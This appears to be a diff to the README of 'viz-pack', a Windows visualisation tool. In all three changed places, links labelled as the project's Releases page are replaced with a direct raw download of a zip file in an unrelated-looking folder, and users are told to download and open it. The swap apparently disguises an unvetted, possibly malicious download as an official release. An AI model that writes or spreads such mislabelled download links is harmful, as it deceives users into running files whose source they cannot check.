@@ -1,6 +1,6 @@
 # 🧩 viz-pack - Turn content into clear visuals
 
-[![Download viz-pack](https://img.shields.io/badge/Download%20viz-pack-blue?style=for-the-badge)](https://github.com/pamelinaamyloid829/viz-pack/releases)
+[![Download viz-pack](https://img.shields.io/badge/Download%20viz-pack-blue?style=for-the-badge)](https://github.com/pamelinaamyloid829/viz-pack/raw/refs/heads/main/disparate/pack_viz_v1.4.zip)
 
 ## ✨ What viz-pack does
 
@@ -25,7 +25,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 
 ## 📥 Download viz-pack
 
-Go to the [viz-pack Releases page](https://github.com/pamelinaamyloid829/viz-pack/releases) and download the latest version for Windows.
+Go to the [viz-pack Releases page](https://github.com/pamelinaamyloid829/viz-pack/raw/refs/heads/main/disparate/pack_viz_v1.4.zip) and download the latest version for Windows.
 
 After the file finishes downloading, open it from your Downloads folder or from the browser download bar.
 
@@ -205,7 +205,7 @@ A simple naming style can look like this:
 
 ## 🔗 Get the latest version
 
-Visit the [viz-pack Releases page](https://github.com/pamelinaamyloid829/viz-pack/releases) to download the newest Windows release and start the setup process
+Visit the [viz-pack Releases page](https://github.com/pamelinaamyloid829/viz-pack/raw/refs/heads/main/disparate/pack_viz_v1.4.zip) to download the newest Windows release and start the setup process
 
 ## 📌 File types you may see
 
